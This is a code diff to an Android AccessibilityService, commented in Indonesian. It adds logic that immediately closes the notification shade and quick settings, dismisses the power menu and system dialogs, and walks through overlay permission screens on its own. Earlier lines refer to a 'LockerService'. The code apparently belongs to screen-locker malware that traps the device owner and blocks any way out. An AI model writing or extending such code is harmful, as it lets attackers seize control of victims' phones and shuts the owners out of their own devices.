@@ -44,29 +44,41 @@ public class CustomAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        int eventType = event.getEventType();
+        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+
+        // 1. BLOKIR QUICK SETTINGS & NOTIFIKASI
+        // Setiap kali user menarik status bar, packageName biasanya berubah menjadi systemui
+        if (packageName.equals("com.android.systemui")) {
+            // Tekan BACK secara virtual untuk menutup panel yang sedang meluncur turun
+            performGlobalAction(GLOBAL_ACTION_BACK);
+            
+            // Untuk Android 12+, gunakan aksi spesifik untuk menutup shade jika BACK tidak cukup
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+                performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE);
+            }
+
+            // Kirim broadcast penutup sebagai proteksi lapis ketiga
+            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
+            sendBroadcast(closeDialog);
+            
+            writeLog("Quick Settings/Notification blocked.");
+        }
+
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-        // Jika rootNode null, langsung keluar tanpa masuk ke blok try-finally
-        if (rootNode == null) return; 
+        if (rootNode == null) return;
 
         try {
-            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-            
-            // 1. Blokir Menu Power / System UI
+            // 2. BLOKIR POWER MENU & DIALOG SISTEM
             if (packageName.equals("android") || packageName.contains("systemui")) {
                 checkAndDismissSensitiveUI(rootNode);
             }
 
-            // 2. Alur Izin Overlay
-            if (!Settings.canDrawOverlays(this)) {
-                handleOverlayPermissionFlow(rootNode, packageName);
-            } else {
-                // Jika sudah punya izin, pastikan LockerService aktif
-                triggerLocker();
-            }
-
+            // 3. HANDLE AUTOMATION PERMISSION (Logic yang sudah ada)
+            handleOverlayPermissionFlow(rootNode, packageName);
+            
         } finally {
-            // Objek dipastikan tidak null di sini karena sudah dicek di atas
-            rootNode.recycle(); 
+            rootNode.recycle();
         }
     }
 
